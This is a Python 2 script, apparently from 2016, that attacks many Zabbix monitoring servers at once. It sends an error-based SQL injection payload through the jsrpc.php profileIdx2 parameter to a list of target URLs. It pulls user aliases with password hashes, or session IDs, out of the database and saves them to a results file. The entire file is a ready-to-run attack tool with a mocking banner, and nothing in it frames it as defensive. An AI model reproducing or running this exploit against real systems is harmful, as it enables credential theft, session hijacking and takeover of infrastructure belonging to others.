#coding=utf-8
import Queue
import threading
import re
import requests
import time
import argparse
import urlparse
lock = threading.Lock()


class WorkManager(object):
    def __init__(self,filepath,action,thread_num):
        self.work_queue=Queue.Queue()
        self.threads=[]
        all_urls=self.all_target_url(filepath)
        self.init_work_queue(all_urls,action)
        self.init_thread_pool(thread_num)

    def init_work_queue(self,all_urls,action):
        if action=='password':
            for url in all_urls:
                self.work_queue.put((getpass,url))
        elif action=='session':
            for url in all_urls:
                self.work_queue.put((getsession, url))

    def init_thread_pool(self,thread_num):
        for i in range(thread_num):
            self.threads.append(Work(self.work_queue))

    def wait_allcomplete(self):
        for item in self.threads:
            if item.isAlive():
                item.join()

    def all_target_url(self,filepath):

        all_urls=open(filepath).readlines()
        all_urls=[url.strip() for url in all_urls]
        return all_urls


class Work(threading.Thread):
    def __init__(self, work_queue):
        threading.Thread.__init__(self)
        self.work_queue = work_queue
        self.start()

    def run(self):
        while True:
            try:
                do, args = self.work_queue.get(block=False)
                do(args)
                self.work_queue.task_done()
            except:
                break

def getpass(url,num=5):
    results=[]

    for x in range(0,num):
        try:
            payload = '/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2 and (select 1 from (select count(*),concat(floor(rand(0)*2), (select concat(alias,0x3a,passwd) from zabbix.users limit %s,1))x from information_schema.character_sets group by x)y) &updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1'%str(x)
            url=url+payload
            text=requests.get(url).content
            pat = re.compile(r"\[Duplicate entry '1(.+?)'", re.S)
            result = re.findall(pat, text)[0]
            results.append(result)

        except Exception, e:
            break
    print urlparse.urlparse(url).netloc + 'Done!!\n'
    lock.acquire()
    f.write('%s\n'%urlparse.urlparse(url).netloc)
    for x in results:
        f.write('%s\n'%x)
    f.write('\n\n')
    lock.release()


def getsession(url,num=5):
    results=[]
    for x in range(0, num):
        try:
            payload = '/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&\
    hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2 and (select 2333 from (select count(*),concat(floor\
        (rand(0)*2), (select concat(0x7e,0x7e,sessionid,0x7e,0x7e) from sessions limit %s,1))x from information_schema.character_sets \
group by x)y) &updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=\
showlatest&filter=&filter_task=&mark_color=1'  % str(x)
            url = url + payload
            text = requests.get(url).content
            pat = re.compile(r"\[Duplicate entry '1~~(.*?)~~", re.S)
            result = re.findall(pat, text)[0]
            results.append(result)
        except Exception, e:
            break

    print urlparse.urlparse(url).netloc + 'Done!!\n'
    lock.acquire()
    f.write('%s\n' % urlparse.urlparse(url).netloc)
    for x in results:
        f.write('%s\n' % x)
    f.write('\n\n')
    lock.release()


if __name__ == '__main__':
    logo = '''\n
     _____     _     _     _      _____           _
    |__  /__ _| |__ | |__ (_)_  _|  ___|   _  ___| | __
      / // _` | '_ \| '_ \| \ \/ / |_ | | | |/ __| |/ /
     / /| (_| | |_) | |_) | |>  <|  _|| |_| | (__|   <
    /____\__,_|_.__/|_.__/|_/_/\_\_|   \__,_|\___|_|\_\

    \n  **************coded by Faith4444 2016-8-19*****************
    '''
    print logo
    start = time.time()
    parser = argparse.ArgumentParser(description = 'Zabbix Sql Injection')
    parser.add_argument('--action', action = 'store', dest = 'action')
    parser.add_argument('--file', action = 'store', dest = 'file')
    parser.add_argument('--threads', action='store', dest='threads',default="10",type=int)
    given_args = parser.parse_args()
    action = given_args.action
    filepath = given_args.file
    thread_num = given_args.threads
    f=open('result.txt','w')
    work_manager = WorkManager(filepath,action,thread_num)
    work_manager.wait_allcomplete()
    end = time.time()
    f.close()
    print "time:%s"%(end-start)